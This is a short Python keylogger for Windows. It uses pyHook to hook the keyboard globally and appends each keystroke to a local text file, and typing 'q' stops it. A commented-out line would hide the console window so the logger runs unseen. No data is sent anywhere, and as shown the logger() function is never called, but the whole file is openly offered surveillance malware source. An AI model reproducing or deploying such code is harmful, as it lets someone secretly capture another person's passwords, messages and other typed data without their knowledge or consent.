#!/usr/bin/python
import pyHook
import pythoncom
import win32gui
import win32console

def logger():
	log_file = "log_file.txt"                 #name of log file
	window = win32console.GetConsoleWindow()  #go to script window
	#win32gui.ShowWindow(window,0)             #hide window

	def pressed_chars(event):       #on key pressed function
	    if event.Ascii:
	        f = open(log_file,"a")  # (open log_file in append mode)
	        char = chr(event.Ascii) # (insert real char in variable)
	        if char == "q":         # (if char is q)
	            f.close()           # (close and save log file)	
	            exit()              # (exit program)
	        if event.Ascii == 13:   # (if char is "return")
	            f.write("\n")       # (new line)
	        f.write(char)           # (write char)



	proc = pyHook.HookManager()      #open pyHook
	proc.KeyDown = pressed_chars     #set pressed_chars function on KeyDown event
	proc.HookKeyboard()              #start the function
	pythoncom.PumpMessages()         #get input